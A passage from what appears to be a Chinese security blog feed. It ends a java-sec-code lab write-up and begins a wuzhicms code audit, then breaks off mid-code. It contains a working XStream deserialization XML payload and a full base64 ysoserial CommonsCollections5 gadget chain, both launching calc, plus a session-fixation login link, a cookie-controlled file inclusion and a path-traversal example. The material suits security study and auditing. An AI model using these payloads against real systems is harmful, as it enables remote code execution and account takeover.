class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=629E8EB9997DA26781472C6FFCAF7454; XSRF-TOKEN=f6390ed7-0e1c-4fbe-a342-1177716a0983; remember-me=YWRtaW46MTc1NDgwMTUzMDEzMTowZDM3ZjcxZDFmODc2YmUyNDQ0NGY3MmZkYTFkY2NmMQ<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>439<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span>  </span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span> <span class="hljs-comment">&lt;!-- --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>cmd<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947651.png" alt="20250727132402482"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>java经典反序列化漏洞复现</p><p><a href="https://www.cnblogs.com/0kooo-yz/p/18399516">https://www.cnblogs.com/0kooo-yz/p/18399516</a></p><p>代码审计入门之java-sec-code（一）</p><p><a href="https://www.freebuf.com/articles/web/289863.html">https://www.freebuf.com/articles/web/289863.html</a></p><p>Java-Sec代码审计漏洞篇(一)</p><p><a href="https://xz.aliyun.com/news/15669">https://xz.aliyun.com/news/15669</a></p><p>Java-Sec代码审计漏洞篇(二)</p><p><a href="https://xz.aliyun.com/news/15721">https://xz.aliyun.com/news/15721</a></p><p>Java-sec-code靶场分析练习</p><p><a href="https://buaq.net/go-307106.html">https://buaq.net/go-307106.html</a></p><p>java-sec-code 靶场复现</p><p><a href="https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/">https://odiws.github.io/2025/07/08/java-sec-code%E5%A4%8D%E7%8E%B0/</a></p><p>SnakeYaml反序列化漏洞研究</p><p><a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p><p>跨域资源共享 CORS 详解</p><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p><p>初识HTTP响应拆分攻击（CRLF Injection）</p><p><a href="https://www.anquanke.com/post/id/240014">https://www.anquanke.com/post/id/240014</a></p><p>CSRF漏洞原理攻击与防御（非常细）-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a></p><p>JSONP 跨域原理及实现</p><p><a href="https://segmentfault.com/a/1190000041946934">https://segmentfault.com/a/1190000041946934</a></p><p> PostgreSQL JDBC 驱动远程代码执行漏洞（CVE-2022-21724）</p><p><a href="https://avd.aliyun.com/detail?id=AVD-2022-21724&timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr+mCnCoD">https://avd.aliyun.com/detail?id=AVD-2022-21724&amp;timestamp__1384=eqA27KD5BKAK4YqGNDQRhMiKvr%2BmCnCoD</a></p><p>PreparedStatement的使用</p><p><a href="https://www.cnblogs.com/ysw-go/p/5459330.html">https://www.cnblogs.com/ysw-go/p/5459330.html</a></p><p>路径穿越（Path Traversal）详解-CSDN博客</p><p><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">https://blog.csdn.net/qingzhantianxia/article/details/128204437</a></p><p>SSTI（模板注入）漏洞（入门篇）</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p><p>由浅入深SpEL表达式注入漏洞</p><p><a href="http://rui0.cn/archives/1043">http://rui0.cn/archives/1043</a></p><p>XXE漏洞原理、检测与修复</p><p><a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">https://www.cnblogs.com/mysticbinary/p/12668547.html</a></p><p>从XML相关一步一步到XXE漏洞</p><p><a href="https://xz.aliyun.com/news/6483">https://xz.aliyun.com/news/6483</a></p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p><h1 id="工具的安装-使用"><a href="#工具的安装-使用" class="headerlink" title="工具的安装&amp;使用"></a>工具的安装&amp;使用</h1><h2 id="ysoserial-jar"><a href="#ysoserial-jar" class="headerlink" title="ysoserial.jar"></a>ysoserial.jar</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br><br>检查Java版本：<br>java -version<br>若未安装：<br><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install openjdk-8-jdk-headless<br><br>安装 Git 和 Maven<br><span class="hljs-built_in">sudo</span> apt install git maven -y<br><br>拉取源码<br>git <span class="hljs-built_in">clone</span> https://github.com/frohoff/ysoserial.git<br><br>编译<br><span class="hljs-built_in">cd</span> ysoserial<br>mvn clean package -DskipTests<br><br>编译后所在文件夹<br><span class="hljs-built_in">cd</span> target/ysoserial-0.0.6-SNAPSHOT-all.jar <br><br>重命名<br><span class="hljs-built_in">cp</span> target/ysoserial-*-all.jar ~/ysoserial.jar<br><br>测试是否安装成功<br>java -jar ysoserial.jar<br><br>生成payload<br>calcWindows 内置命令<br><span class="hljs-string">&quot;gnome-calculator&quot;</span>Linux + GUI + 有此命令<br><span class="hljs-string">&quot;open -a Calculator&quot;</span>macOS + 图形环境<br><br>Windows：<br><br>java -jar ~/ysoserial.jar CommonsCollections5 calc | <span class="hljs-built_in">base64</span><br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wuzhicms 代码审计</title>
    <link href="/2025/07/20/wuzhicms/"/>
    <url>/2025/07/20/wuzhicms/</url>
    
    <content type="html"><![CDATA[<h1 id="wuzhicms-代码审计"><a href="#wuzhicms-代码审计" class="headerlink" title="wuzhicms 代码审计"></a>wuzhicms 代码审计</h1><h1 id="根目录分析"><a href="#根目录分析" class="headerlink" title="根目录分析"></a>根目录分析</h1><p>apiAPI接口，找未授权、SQL注入<br>caches 缓存目录<br>configs配置文件<br>coreframe框架核心代码<br>install安装目录，安装后应删除<br>map<br>promote<br>res静态资源<br>uploadfile上传文件储存目录，文件上传漏洞</p><h1 id="分析代码-参考README-md"><a href="#分析代码-参考README-md" class="headerlink" title="分析代码(参考README.md)"></a>分析代码(参考README.md)</h1><p>程序模块结构说明</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">-- coreframe                   #框架目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- app                     #模块（应用程序）目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- affiche             #公告模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- appshop             #应用商城</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- attachment          #附件模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- collect             #采集器</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content             #内容模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core                #核心模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- coupon              #优惠券模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- credit              #积分模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- database            #数据库模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- dianping            #点评模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- guestbook           #留言板模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- link                #友情链接模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- linkage             #联动菜单</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- member              #会员模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- message             #站内短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- mobile              #移动手机模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- order               #订单模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- pay                 #支付模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- ppc                 #推广模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- receipt             #发票申请模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- search              #全站搜索模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- sms                 #短信模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- tags                #tags模块</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">   --- template            #在线模板编辑</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- configs                 #框架配置</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- core.php                #框架入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab                 #定时脚本目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- crontab.php             #定时脚本入口</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- extend                  #扩展目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- languages               #语言包</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板</span><br><span class="hljs-string"></span>|<span class="hljs-string">-- caches                      #缓存目录</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- _cache_                 #公共缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- block                   #区块、碎片缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- content                 #内容模块缓存，栏目缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- db_bak                  #数据库备份路径</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- install.check           #安装锁定</span><br><span class="hljs-string"></span>|<span class="hljs-string">   </span>|<span class="hljs-string">-- model                   #模型缓存</span><br><span class="hljs-string"></span>|<span class="hljs-string">   --- templates               #模板缓存</span><br><span class="hljs-string">--- www                         #网站根目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- 404.html                #404页面</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- admin.php               #后台入口</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- api                     #api目录</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- configs                 #网站配置</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- favicon.ico             #浏览器icon</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.html              #网站首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- index.php               #动态地址首页</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- res                     #静态资源</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- robots.txt              #搜索引擎防抓取规则</span><br><span class="hljs-string">    </span>|<span class="hljs-string">-- uploadfile              #附件</span><br><span class="hljs-string">    `-- web.php                 #自定义路由</span><br></code></pre></td></tr></table></figure><h2 id="app-模块（应用程序）目录"><a href="#app-模块（应用程序）目录" class="headerlink" title="app&#x2F; #模块（应用程序）目录"></a>app&#x2F; #模块（应用程序）目录</h2><p>先去核心模块看</p><h3 id="coreframe-app-core-admin-index-php后台登录首页"><a href="#coreframe-app-core-admin-index-php后台登录首页" class="headerlink" title="coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页"></a>coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;index.php后台登录首页</h3><p>因为没有对$lang进行检验和过滤，通过设置cookie值，对require的路径拼接，使require执行任何PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;<br>        <br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">left</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$lang</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) ? <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;lang&#x27;</span>) : LANG;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;languages/&#x27;</span>.<span class="hljs-variable">$lang</span>.<span class="hljs-string">&#x27;/admin_menu.lang.php&#x27;</span>;              <br></code></pre></td></tr></table></figure><p>此处是ai发现的一个漏洞，实际上很难触发，记录：</p><ol><li>登录成功后不生成新session ID</li><li>直接重用攻击者提供的session ID</li></ol><p>利用：</p><ol><li>攻击者获取自己的session ID：<code>PHPSESSID=attacker_sess</code></li><li>构造钓鱼链接：</li></ol><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://target.com/admin/?m=core&amp;f=index&amp;v=login&amp;submit=1&amp;checkcode=...</span>[<span class="hljs-string">有效验证码</span>]...&amp;username=admin&amp;password=123456<br></code></pre></td></tr></table></figure><ol><li>诱使管理员点击链接（含攻击者的session ID）</li><li>管理员登录后，攻击者使用相同的<code>PHPSESSID</code>即可直接进入管理员账户</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//登录</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//已经登陆的用户重定向到后台首页</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;already login&#x27;</span>), <span class="hljs-string">&#x27;?m=core&amp;f=index&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">su</span>(<span class="hljs-number">0</span>));<br>        &#125;<br>...<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>暴露敏感信息：当然，需要登录到后台才能利用，所以不算高危。</p><p>路由：</p><p><code>http://wuzhicms:7575/index.php?m=core&amp;f=index&amp;_su=wuzhicms&amp;v=phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 显示 phpinfo 内容</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">phpinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080954694.png" alt="20250717125939730"></p><h3 id="coreframe-app-appupdate-admin-index-php"><a href="#coreframe-app-appupdate-admin-index-php" class="headerlink" title="coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php"></a>coreframe&#x2F;app&#x2F;appupdate&#x2F;admin&#x2F;index.php</h3><p>如果 $filePath 为 ..&#x2F;..&#x2F;..&#x2F;index.php，则 COREFRAME_ROOT . ‘..&#x2F;..&#x2F;..&#x2F;index.php’ 就可以指向系统目录外的敏感文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_deleteFilesForPackageUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$packageDir</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>)) 